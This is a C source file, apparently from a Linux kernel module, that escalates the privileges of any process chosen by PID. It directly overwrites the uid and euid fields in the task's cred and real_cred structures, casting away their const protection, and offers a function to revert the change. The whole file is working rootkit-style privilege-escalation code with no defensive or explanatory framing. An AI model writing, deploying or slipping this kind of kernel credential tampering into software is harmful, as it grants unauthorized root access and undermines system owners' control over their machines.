#include "privilege_escalation.h"

void set_new_uid(struct cred *c, u_int target_uid)
{
	kuid_t new_uid = KUIDT_INIT(target_uid);
	c->uid = new_uid;
	c->euid = new_uid;
}

void set_new_gid(struct cred *c, u_int target_gid)
{
	kgid_t new_gid = KGIDT_INIT(target_gid);
	c->gid = new_gid;
	c->egid = new_gid;
}

struct task_struct *find_task_from_pid(int pid)
{
	struct pid *task_pid;
	struct task_struct *task;

	task_pid = find_vpid(pid);
	if (task_pid == NULL) {
		printk(KERN_INFO
		       "[Priv_Esc] - Did not find pid struct from pid %d\n",
		       pid);
		return NULL;
	}

	task = pid_task(task_pid, PIDTYPE_PID);
	return task;
}

void escalate_pid(int pid, int target_priv)
{
	struct task_struct *task;
	task = find_task_from_pid(pid);

	if (target_priv < 0) {
		printk(KERN_WARNING
		       "[Priv_Esc] - Invalid uid, %d, must be castable to u_int\n",
		       target_priv);
		return;
	}

	if (task != NULL) {
		printk(KERN_INFO
		       "[Priv_Esc] - Found task from pid %d, escalating\n",
		       pid);
		set_new_uid((struct cred *)task->cred, target_priv);
		set_new_uid((struct cred *)task->real_cred, target_priv);
	}
}

void revert_creds_pid(int pid)
{
	struct task_struct *task;
	task = find_task_from_pid(pid);

	if (task != NULL) {
		printk(KERN_INFO
		       "[Priv_Esc] - Found task from pid %d, reverting creds\n",
		       pid);
		set_new_uid((struct cred *)task->cred, task->cred->suid.val);
		set_new_uid((struct cred *)task->real_cred,
			    task->real_cred->suid.val);
	}
}